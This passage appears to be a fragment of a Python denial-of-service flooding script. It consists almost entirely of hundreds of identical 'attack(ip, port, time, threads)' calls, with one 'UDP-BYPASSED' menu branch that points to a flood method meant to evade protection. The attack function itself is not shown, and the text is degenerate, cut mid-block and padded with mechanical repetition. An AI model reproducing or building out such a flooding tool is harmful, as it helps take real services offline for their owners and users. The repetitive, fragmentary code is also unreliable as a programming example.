        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
     if choice == 'UDP-BYPASSED':
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
